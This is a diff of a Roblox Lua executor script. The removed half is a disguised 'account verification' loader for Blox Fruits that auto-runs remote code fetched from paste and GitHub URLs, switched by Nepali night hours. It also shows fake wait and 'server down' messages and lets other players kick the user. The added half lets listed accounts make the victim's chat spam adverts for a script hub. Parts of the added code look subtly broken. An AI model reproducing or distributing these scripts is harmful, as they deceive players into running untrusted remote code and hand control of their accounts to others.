@@ -1,183 +1,85 @@
-local BLOXFRUIT_PLACE_IDS = {
- 2753915549, -- Main Game
- 4442272183, -- Second Sea
- 7449423635, -- Third Sea
- 8204899141, -- Sea Events / Extra
+-- Roblox Chat Bot Script (Authorized User Check)
+-- Paste this into your executor
+
+-- Configuration
+local authorizedUsers = {
+    ["unishaunishaaaa"] = true,
+    ["kjaniyla"] = true,
+    ["killer_guy69"] = true,
+    ["IMKHAN1981"] = true,
+    ["BloxHatLuffy"] = true,
+    ["unishalt1"] = true,
+    ["ankit_2068"] = true,
+    ["khursani6"] = true,
+    ["user123"] = true
 }
+local triggerCommand = "!say"
+local responseMessages = {"DR!X SCRIPT HUB ON TOP", "GET THE BEST SCR!PT OF BLOXFRUIT", "FOLLOW DR!X SCRIPT HUB ON T!KK-T0KK "} -- Three separate messages
+local messageInterval = 5 -- seconds
+local maxMessages = 100
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local localPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+-- Variables
+local messageCount = 0
+local isRunning = false
+local connection = nil
 
--- Check if in Blox Fruits
-local function isInBloxFruits()
- for _, id in pairs(BLOXFRUIT_PLACE_IDS) do
-  if game.PlaceId == id then
-   return true
-  end
- end
- return false
+-- Function to send chat message
+function sendChatMessage(message)
+    if messageCount >= maxMessages then
+        isRunning = false
+        if connection then
+            connection:Disconnect()
+        end
+        return
+    end
+    
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    messageCount = messageCount + 1
 end
 
--- Kick if not in Blox Fruits
-if not isInBloxFruits() then
- localPlayer:Kick("THIS SCRIPT ONLY WORK ON BLOXFRUIT")
- return
+-- Function to handle chat messages
+function onChatMessage(message, speaker)
+    -- Check if the speaker is an authorized user
+    if authorizedUsers[speaker.Name] then
+        -- Check if the message is the trigger command
+        if string.lower(message) == triggerCommand then
+            if not isRunning then
+                isRunning = true
+                messageCount = 0
+                
+                -- Start sending messages
+                spawn(function()
+                    while isRunning and messageCount < maxMessages do
+                        -- Send all three messages in sequence
+                        for i, msg in ipairs(responseMessages) do
+                            sendChatMessage(msg)
+                            wait(1) -- Small delay between the three messages
+                        end
+                        wait(messageInterval) -- Wait before sending the next set
+                    end
+                    isRunning = false
+                end)
+            end
+        end
+    end
 end
 
--- Kick local player if ANY player says "kp" in chat
-local function monitorPlayerChat(player)
- player.Chatted:Connect(function(msg)
-  if msg:lower() == "kp" then
-   localPlayer:Kick("WE HAVE CAUGHT YOU USING EXPLOIT WE DONT BAN INSTEAD OF THAT WE REMOVE YOUR MYTHICAL FRUIT")
-  end
- end)
+-- Main function to initialize the script
+function init()
+    -- Connect to chat event
+    connection = game:GetService("Players").PlayerChatted:Connect(onChatMessage)
+    
+    -- Alternative method for games without PlayerChatted event
+    if not connection.Connected then
+        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+            if player:FindFirstChild("Chatted") then
+                connection = player.Chatted:Connect(function(message, recipient)
+                    onChatMessage(message, player)
+                end)
+            end
+        end
+    end
 end
 
-for _, p in pairs(Players:GetPlayers()) do
- if p ~= localPlayer then
-  monitorPlayerChat(p)
- end
-end
-
-Players.PlayerAdded:Connect(function(player)
- if player ~= localPlayer then
-  monitorPlayerChat(player)
- end
-end)
-
--- GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "DrixVerifyGui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 140)
-frame.Position = UDim2.new(0.5, -110, 0.5, -70)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = screenGui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = frame
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "ACC VERIFICATION"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextScaled = true
-title.Font = Enum.Font.SourceSansBold
-title.Parent = frame
-
-local loadButton = Instance.new("TextButton")
-loadButton.Size = UDim2.new(0.8, 0, 0, 36)
-loadButton.Position = UDim2.new(0.1, 0, 0.55, 0)
-loadButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-loadButton.Text = "LOAD SCRIPT"
-loadButton.TextScaled = true
-loadButton.Font = Enum.Font.SourceSansBold
-loadButton.Parent = frame
-
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 8)
-buttonCorner.Parent = loadButton
-
--- Rainbow Text Effect
-local hue = 0
-RunService.RenderStepped:Connect(function()
- hue = (hue + 0.01) % 1
- loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)
-end)
-
--- Get Nepali Time (UTC+5:45)
-local function isNepaliNight()
- local utcTime = os.time(os.date("!*t"))
- local offset = 5 * 3600 + 45 * 60
- local nepaliHour = tonumber(os.date("!*t", utcTime + offset).hour)
- return (nepaliHour >= 22 or nepaliHour < 7)
-end
-
--- Script Loader
-local function loadScript()
- loadButton.Active = false
- loadButton.Text = "LOADED"
-
- local warningGui = Instance.new("ScreenGui")
- warningGui.Name = "ScriptLoadWarning"
- warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
- warningGui.ResetOnSpawn = false
- warningGui.Parent = localPlayer:WaitForChild("PlayerGui")
-
- local warningFrame = Instance.new("Frame")
- warningFrame.Size = UDim2.new(0.7, 0, 0.15, 0)
- warningFrame.Position = UDim2.new(0.5, -250, 0.65, 0)
- warningFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
- warningFrame.BorderSizePixel = 0
- warningFrame.ZIndex = 10
- warningFrame.Parent = warningGui
-
- local frameCorner = Instance.new("UICorner")
- frameCorner.CornerRadius = UDim.new(0, 10)
- frameCorner.Parent = warningFrame
-
- local warningLabel = Instance.new("TextLabel")
- warningLabel.Size = UDim2.new(1, -20, 1, -20)
- warningLabel.Position = UDim2.new(0, 10, 0, 10)
- warningLabel.BackgroundTransparency = 1
- warningLabel.Text = "⚠️ PLEASE WAIT 5–8 MINUTES FOR THE SCRIPT TO MODIFY THE SCRIPT ⚠️"
- warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
- warningLabel.TextScaled = true
- warningLabel.Font = Enum.Font.SourceSansBold
- warningLabel.ZIndex = 11
- warningLabel.Parent = warningFrame
-
- task.spawn(function()
-  while warningLabel and warningLabel.Parent do
-   warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-   task.wait(0.5)
-   warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-   task.wait(0.5)
-  end
- end)
-
- task.delay(60, function()
-  if warningGui then
-   warningGui:Destroy()
-  end
- end)
-
- task.delay(15 * 60, function()
-  localPlayer:Kick("PLS TRY THIS SCRIPT AFTER 3-4HOUR DUE TO THE SERVER DOWN")
- end)
-
- task.delay(2, function()
-  local url = isNepaliNight()
-   and "https://raw.githubusercontent.com/ilovenew/New-bloxfruit-script/main/Bloxfruit_script"
-   or "https://pastefy.app/SHjsiqS4/raw"
-
-  local success, err = pcall(function()
-   loadstring(game:HttpGet(url))()
-  end)
-  if not success and warningLabel then
-   warningLabel.Text = "Failed to load script."
-   warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-  end
- end)
-end
-
--- Manual click
-loadButton.MouseButton1Click:Connect(loadScript)
-
--- Auto-click after 3 seconds
-task.delay(3, function()
- if loadButton and loadButton.Parent and loadButton.Active then
-  loadButton:Activate()
- end
-end)
+-- Start the script
+init()
